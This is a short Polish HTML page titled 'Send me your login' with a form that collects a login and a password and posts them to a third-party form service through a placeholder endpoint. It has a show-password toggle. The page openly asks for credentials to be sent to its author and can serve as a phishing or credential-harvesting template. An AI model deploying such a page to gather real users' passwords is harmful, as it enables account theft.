<!DOCTYPE html>
<html lang="pl">
<head>
  <meta charset="UTF-8">
  <title>Wyślij do mnie login</title>
  <style>
    body { font-family: Arial; text-align: center; padding: 40px; background: #f2f2f2; }
    form { background: white; padding: 30px; display: inline-block; border-radius: 15px; box-shadow: 0 0 10px rgba(0,0,0,0.2); }
    input, button { padding: 10px; margin: 10px; width: 250px; font-size: 16px; }
    button { background: #007bff; color: white; border: none; border-radius: 8px; }
    button:hover { background: #0056b3; }
  </style>
</head>
<body>

  <h2>Wyślij dane do mnie</h2>

  <form action="https://formspree.io/f/your-code-here" method="POST">
    <input type="text" name="login" placeholder="Login" required><br>
    <input type="password" name="haslo" placeholder="Hasło" required><br>
    <label><input type="checkbox" onclick="pokaz()"> Pokaż hasło</label><br>
    <button type="submit">Wyślij</button>
  </form>

  <script>
    function pokaz() {
      const haslo = document.querySelector('input[name="haslo"]');
      haslo.type = haslo.type === "password" ? "text" : "password";
    }
  </script>

</body>
</html>
